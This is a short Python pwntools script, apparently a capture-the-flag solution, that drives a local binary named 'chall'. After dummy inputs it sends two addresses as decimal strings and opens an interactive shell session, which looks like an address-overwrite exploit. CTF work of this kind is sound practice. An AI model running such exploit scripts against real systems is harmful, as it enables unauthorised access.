from pwn import *


p=process("./chall")
print p.recv()
p.sendline("1234")
print p.recv()
p.sendline("123")
print p.recv()
pause()
p.send("6295104")
#p.send(p64(0x600e40))
p.send("4195984")
#0x600e40
p.interactive()












